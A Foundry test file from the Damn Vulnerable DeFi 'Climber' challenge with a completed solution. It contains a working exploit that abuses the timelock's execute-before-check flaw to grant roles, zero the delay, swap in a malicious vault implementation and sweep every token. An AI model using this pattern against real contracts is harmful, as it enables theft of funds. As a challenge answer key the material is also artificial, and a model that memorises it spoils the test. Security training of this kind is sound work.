// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The ClimberTimelock.execute() function has a critical bug - it executes all
         * operations BEFORE checking if they were properly scheduled. This means:
         * 
         * 1. We can call execute() with operations that will schedule themselves
         * 2. The operations execute first (including the scheduling call)
         * 3. THEN the check passes because the operation is now "scheduled"
         *
         * Additionally, we can:
         * - Grant ourselves PROPOSER_ROLE so we can schedule
         * - Set delay to 0 so operations are immediately executable
         * - Upgrade the vault to a malicious implementation
         *
         * EXPLOIT STRATEGY:
         * 1. Deploy attacker contract
         * 2. Call timelock.execute() with operations that:
         *    a) Grant PROPOSER_ROLE to attacker
         *    b) Set delay to 0 (so scheduled ops are immediately ready)
         *    c) Upgrade vault to malicious implementation
         *    d) Call attacker to schedule this exact same batch
         * 3. The attacker callback schedules the same operation (with delay=0, it's immediately ready)
         * 4. After execute() completes, sweep funds from the upgraded vault
         */

        // Deploy malicious vault implementation
        MaliciousVault maliciousImpl = new MaliciousVault();

        // Deploy the attacker
        ClimberAttacker attacker = new ClimberAttacker(
            payable(address(timelock)),
            address(vault),
            address(maliciousImpl),
            address(token),
            recovery
        );

        // Execute the attack
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

/**
 * @notice Malicious vault implementation that allows anyone to sweep funds
 */
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
        _sweeper = sweeper;
        _lastWithdrawalTimestamp = block.timestamp;
    }

    // Open sweepFunds - anyone can call, sends to specified recipient
    function sweepFunds(address token, address recipient) external {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

/**
 * @notice Attacker contract that exploits the execute-before-check vulnerability
 */
contract ClimberAttacker {
    ClimberTimelock public immutable timelock;
    address public immutable vault;
    address public immutable maliciousImpl;
    address public immutable token;
    address public immutable recovery;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(
        address payable _timelock,
        address _vault,
        address _maliciousImpl,
        address _token,
        address _recovery
    ) {
        timelock = ClimberTimelock(_timelock);
        vault = _vault;
        maliciousImpl = _maliciousImpl;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // Build the batch of operations
        // We need 4 operations minimum (MIN_TARGETS check)

        // Operation 1: Grant PROPOSER_ROLE to this contract
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(
            timelock.grantRole,
            (PROPOSER_ROLE, address(this))
        ));

        // Operation 2: Set delay to 0 (so our scheduled op is immediately ready)
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(
            timelock.updateDelay,
            (0)
        ));

        // Operation 3: Upgrade vault to malicious implementation
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (maliciousImpl, "")
        ));

        // Operation 4: Call this contract to schedule the exact same operation
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeCall(this.scheduleOperation, ()));

        // Use a deterministic salt
        salt = bytes32("climber");

        // Execute the batch - this will call scheduleOperation() which schedules this same batch
        timelock.execute(targets, values, dataElements, salt);

        // Now sweep the funds from the upgraded vault
        MaliciousVault(vault).sweepFunds(token, recovery);
    }

    // Called during execute() to schedule the same operation
    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
